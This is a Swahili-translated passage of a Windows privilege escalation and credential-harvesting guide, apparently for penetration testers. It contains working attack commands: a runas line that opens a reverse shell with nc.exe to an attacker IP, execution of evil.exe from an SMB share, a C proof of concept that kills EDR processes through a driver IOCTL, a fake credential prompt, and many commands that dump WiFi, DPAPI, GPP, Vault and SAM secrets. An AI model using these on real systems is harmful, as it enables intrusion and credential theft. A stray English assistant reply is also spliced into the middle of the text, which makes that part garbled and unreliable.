### Ruhusa za Kuandika

Angalia kama unaweza kubadilisha baadhi ya config file ili kusoma faili maalum au kama unaweza kubadilisha binary itakayotekelezwa na Administrator account (schedtasks).

Njia moja ya kupata ruhusa dhaifu za saraka/faili kwenye mfumo ni kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ huchukua kiotomatiki DLL yoyote ya plugin iliyoko katika subfolders zake za `plugins`. Ikiwa kuna install ya portable/copy inayoweza kuandikwa (writable), kuiweka plugin hasidi hutoa automatic code execution ndani ya `notepad++.exe` kila mara inapoanzishwa (ikijumuisha kutoka `DllMain` na plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Endesha wakati wa kuanzisha

**Angalia kama unaweza kuandika juu ya registry au binary ambayo itatekelezwa na mtumiaji mwingine.**\
**Soma** ukurasa **ufuatao** ili kujifunza zaidi kuhusu maeneo ya kuvutia ya **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta drivers za pande za tatu zinazoweza kuwa **zisizo za kawaida/zilizo na udhaifu**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ikiwa driver inatoa arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), unaweza kuongeza ruhusa kwa kuiba SYSTEM token moja kwa moja kutoka kernel memory. Angalia hatua‑kwa‑hatua mbinu hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Kwa bug za race-condition ambapo sehemu hatarishi ya simu hufungua attacker-controlled Object Manager path, kupunguza kwa makusudi lookup (kutumia max-length components au deep directory chains) kunaweza kuinua dirisha kutoka microseconds hadi kumi za microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities zinakuwezesha kuandaa deterministic layouts, kutegemeza writable HKLM/HKU descendants, na kubadilisha metadata corruption kuwa kernel paged-pool overflows bila custom driver. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Baadhi ya signed third‑party drivers huunda device object yao na SDDL kali kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila flag hii, secure DACL haitekelezwi wakati device inafunguliwa kupitia path yenye component ya ziada, ikiruhusu mtumiaji asiye na ruhusa kupata handle kwa kutumia namespace path kama:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Mara mtumiaji anaweza kufungua device, privileged IOCTLs zilizofunuliwa na driver zinaweza kutumiwa kwa LPE na tampering. Mfano wa uwezo uliobainika kwa vitendo:

- Kurudisha full-access handles kwa arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Kusoma/kuandika raw disk bila vizuizi (offline tampering, boot-time persistence tricks).
- Kumaliza (terminate) arbitrary processes, ikiwemo Protected Process/Light (PP/PPL), kuruhusu AV/EDR kuua kutoka user land kupitia kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Uzuiaji kwa waendelezaji
- Daima weka FILE_DEVICE_SECURE_OPEN unapotengeneza device objects zinazokusudiwa kuzuiwa na DACL.
- Thibitisha muktadha wa caller kwa operesheni zenye ruhusa za juu. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu termination ya process au kurudisha handle.
- Punguza IOCTLs (access masks, METHOD_*, input validation) na tazama mifano ya brokered badala ya ruhusa za kernel za moja kwa moja.

Mawazo ya utambuzi kwa watetezi
- Angalia ufunguzi wa user-mode wa majina ya vifaa yanayoshukiwa (mfano, \\ .\\amsdk*) na mfuatano maalum wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na kuwa na orodha zako za allow/deny.


## PATH DLL Hijacking

Ikiwa una **write permissions inside a folder present on PATH** unaweza kuwa na uwezo wa hijack DLL inayoingizwa na process na **escalate privileges**.

Angalia ruhusa za folda zote ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Mtandao

### Sehemu za kushiriki
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kompyuta nyingine zinazojulikana zilizohardcoded kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Violesura vya Mtandao na DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Bandari Zilizofunguliwa

Angalia kwa **huduma zilizozuiliwa** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Upitishaji
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha kanuni, unda kanuni, zima, zima...)**

Zaidi[ amri za network enumeration hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Faili ya binari `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ikiwa unapata root user unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port itakuuliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanza bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza filesystem ya `WSL` katika folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Kredensiali

### Winlogon Kredensiali
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Meneja wa vitambulisho / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault inahifadhi vitambulisho vya watumiaji kwa seva, tovuti na programu nyingine ambazo **Windows** inaweza **kuwaingia watumiaji kiotomatiki**. Mwanzoni, hii inaweza kuonekana kama watumiaji wanaweza kuhifadhi vitambulisho vya Facebook, Twitter, Gmail n.k., ili waingie kiotomatiki kupitia vivinjari. Lakini si hivyo.

Windows Vault inahifadhi vitambulisho ambavyo Windows inaweza kutumia kuingia watumiaji kiotomatiki, ambayo inamaanisha kwamba programu yoyote ya **Windows ambayo inahitaji vitambulisho kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager** & Windows Vault na kutumia vitambulisho vilivyotolewa badala ya watumiaji kuingiza jina la mtumiaji na nenosiri kila wakati.

Isipokuwa programu hizo zinashirikiana na Credential Manager, sipationi inawezekana kwao kutumia vitambulisho kwa rasilimali fulani. Hivyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba vitambulisho kwa rasilimali hiyo** kutoka kwenye vault ya uhifadhi ya chaguo-msingi.

Tumia `cmdkey` kuorodhesha vitambulisho vilivyohifadhiwa kwenye mashine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` kwa chaguo `/savecred` ili kutumia saved credentials. Mfano ufuatao unaita remote binary kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` kwa seti ya vitambulisho zilizotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kutoka kwa [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** hutoa njia ya usimbaji wa simetriki wa data, inayotumika sana ndani ya mfumo wa uendeshaji wa Windows kwa ajili ya usimbaji wa simetriki wa funguo binafsi zisizo za simetria. Usimbaji huu unatumia siri ya mtumiaji au mfumo ili kuongeza kwa kiasi kikubwa entropy.

**DPAPI inaruhusu usimbaji wa funguo kupitia funguo simetriki inayotokana na siri za kuingia za mtumiaji**. Katika mazingira ya usimbaji ya mfumo, inatumia siri za uthibitisho za domain ya mfumo.

Funguo za RSA za mtumiaji zilizofichwa, kwa kutumia DPAPI, zinahifadhiwa katika `%APPDATA%\Microsoft\Protect\{SID}` directory, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **Funguo la DPAPI, likiwa pamoja na funguo kuu linalolinda funguo binafsi za mtumiaji katika faili hiyo hiyo**, kwa kawaida lina 64 bytes za data za nasibu. (Ni muhimu kutambua kuwa ufikiaji wa kabrasha hili umewekewa vikwazo, ukizuia kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa kinaweza kuorodheshwa kupitia PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` na vigezo vinavyofaa (`/pvk` au `/rpc`) ili kuifungua.

Kwa kawaida, **credentials files protected by the master password** ziko katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili decrypt.\
Unaweza **extract many DPAPI** **masterkeys** kutoka **memory** kwa kutumia module `sekurlsa::dpapi` (ikiwa wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** hutumiwa mara nyingi kwa ajili ya **scripting** na automation tasks kama njia ya kuhifadhi encrypted credentials kwa urahisi. Credentials hizi zinalindwa kwa kutumia **DPAPI**, ambayo kwa kawaida ina maana kwamba zinaweza tu kufanywa decrypted na mtumiaji yule yule kwenye kompyuta ile ile zilipotengenezwa.

Ili **decrypt** PS credentials kutoka kwenye faili inayoiweka unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Recently Run Commands

Amri zilizotumika hivi karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Meneja wa Uthibitisho wa Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Unaweza **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Watu mara nyingi hutumia StickyNotes app kwenye workstations za Windows ili **save passwords** na taarifa nyingine, bila kutambua kuwa ni faili la database. Faili hii iko kwa `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na daima inafaa kutafutwa na kuchunguzwa.

### AppCmd.exe

**Kumbuka kwamba ili recover passwords kutoka AppCmd.exe unahitaji kuwa Administrator na kuendesha chini ya High Integrity level.**\
**AppCmd.exe** iko katika saraka `%systemroot%\system32\inetsrv\`.\  
Iwapo faili hii ipo basi kuna uwezekano kwamba baadhi ya **credentials** zimetayarishwa na zinaweza **recovered**.

Msimbo huu ulitolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` inapatikana .\
Wasakinishaji **huendeshwa kwa SYSTEM privileges**, wengi wanaweza kuathiriwa na **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Mafaili na Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys katika registry

SSH private keys zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia kama kuna kitu cha kuvutia huko:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ikiwa utapata kipengele chochote ndani ya njia hiyo, kuna uwezekano ni SSH key iliyohifadhiwa. Imehifadhiwa kwa usimbaji lakini inaweza kufunjuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Taarifa zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa boot, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda funguo za ssh, kuziongeza kwa `ssh-add` na kuingia kwa ssh kwenye mashine. Registry HKCU\Software\OpenSSH\Agent\Keys haipo na procmon haikuonyesha matumizi ya `dpapi.dll` wakati wa uthibitishaji wa funguo zisizo za simetriki.

### Faili zisizoangaliwa
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa yaliyomo:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Chelezo za SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Vyeti vya Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

### Nenosiri la GPP lililohifadhiwa

Kipengele kilikuwa kinapatikana hapo awali kilichoruhusu deployment ya custom local administrator accounts kwenye group ya machines kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na kasoro kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama XML files ndani ya SYSVOL, zinaweza kufikiwa na mtumiaji yeyote wa domain. Pili, passwords ndani ya GPP hizi, zilizo-encrypt kwa AES256 kwa kutumia default key iliyoelezwa hadharani, zinaweza ku-decryptwa na mtumiaji yeyote aliyethibitishwa. Hii ilileta hatari kubwa, kwa sababu ingeweza kumruhusu mtumiaji kupata privileges zilizoongezwa.

Ili kupunguza hatari hii, ilitengenezwa function inayoscan kwa ajili ya locally cached GPP files zenye field ya "cpassword" ambayo si tupu. Ikitambua faili kama hiyo, function inadekripta password na kurudisha custom PowerShell object. Object hii ina maelezo kuhusu GPP na mahali pa faili, ikisaidia katika utambuzi na urekebishaji wa udhaifu huu wa usalama.

Tafuta katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_ kwa faili hizi:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili ku-decrypt cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata nywila:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config yenye maelezo ya kuingia:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN - taarifa za kuingia
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Omba credentials

Unaweza daima **kuomba user aingize credentials zake au hata credentials za user mwingine** ikiwa unadhani anaweza kuzijua (tahadhari kwamba **kuomba** client moja kwa moja kwa **credentials** ni hatari sana):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayoweza kuwa na credentials**

Faili zinazojulikana ambazo muda fulani uliopita zilikuwa na **passwords** katika **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don’t have access to your repository. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the list of proposed files and their contents). Once you provide the file text, I’ll translate the relevant English to Swahili, preserving all markdown, tags, paths and code as you requested.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Maelezo ya kuingia kwenye RecycleBin

Unapaswa pia kuangalia Bin kutafuta maelezo ya kuingia ndani yake

Ili **kupona nywila** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya rejista

**Vifunguo vingine vya rejista vinavyoweza kuwa na maelezo ya kuingia**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
